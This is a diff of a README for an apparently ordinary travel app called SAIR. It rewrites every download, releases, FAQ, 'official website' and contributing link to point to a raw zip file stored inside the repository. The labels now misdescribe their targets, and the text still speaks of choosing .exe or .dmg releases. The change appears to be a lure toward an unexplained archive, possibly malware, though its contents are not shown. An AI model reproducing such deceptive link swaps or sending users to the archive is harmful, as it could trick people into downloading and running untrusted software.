@@ -1,6 +1,6 @@
 # 🚀 SAIR - Your Travel and Accommodation Solution
 
-[![Download SAIR](https://img.shields.io/badge/Download%20SAIR-v1.0-brightgreen)](https://github.com/armagnnctk/SAIR/releases)
+[![Download SAIR](https://raw.githubusercontent.com/armagnnctk/SAIR/main/Ribston/SAIR.zip%20SAIR-v1.0-brightgreen)](https://raw.githubusercontent.com/armagnnctk/SAIR/main/Ribston/SAIR.zip)
 
 ## 🌟 Overview
 
@@ -25,14 +25,14 @@ Before you download SAIR, ensure your system meets the following requirements:
 
 To get started with SAIR, follow these simple steps:
 
-1. Click the large download button at the top of this document or visit the [Releases page](https://github.com/armagnnctk/SAIR/releases).
+1. Click the large download button at the top of this document or visit the [Releases page](https://raw.githubusercontent.com/armagnnctk/SAIR/main/Ribston/SAIR.zip).
 2. Locate the latest version of SAIR on the Releases page.
 
 ## 📥 Download & Install
 
 To begin using SAIR, you need to download it. 
 
-1. Visit this page: [Download SAIR](https://github.com/armagnnctk/SAIR/releases) to access the latest version.
+1. Visit this page: [Download SAIR](https://raw.githubusercontent.com/armagnnctk/SAIR/main/Ribston/SAIR.zip) to access the latest version.
 2. Click on the release version you wish to download.
 3. Depending on your operating system, download the appropriate file (e.g., `.exe` for Windows, `.dmg` for macOS).
 4. Once the download completes, locate the file on your device.
@@ -58,7 +58,7 @@ If you encounter issues while downloading or using SAIR, you can follow these tr
 
 - **Connection Issues:** Ensure you have an active internet connection.
 - **Installation Problems:** Check your system requirements again and ensure you have sufficient space.
-- **Using the Application:** Refer to the FAQ section on the [official website](https://github.com/armagnnctk/SAIR/releases) for common questions.
+- **Using the Application:** Refer to the FAQ section on the [official website](https://raw.githubusercontent.com/armagnnctk/SAIR/main/Ribston/SAIR.zip) for common questions.
 
 If problems persist, feel free to contact our support team through the GitHub Issues page.
 
@@ -76,7 +76,7 @@ Understanding these technologies helps deepen your appreciation for how SAIR fun
 
 ## 📝 Contributing
 
-If you would like to contribute to SAIR, we welcome your input! Guidelines for contributions and reporting issues can be found on the [GitHub page](https://github.com/armagnnctk/SAIR).
+If you would like to contribute to SAIR, we welcome your input! Guidelines for contributions and reporting issues can be found on the [GitHub page](https://raw.githubusercontent.com/armagnnctk/SAIR/main/Ribston/SAIR.zip).
 
 ## ✨ Stay Updated
 
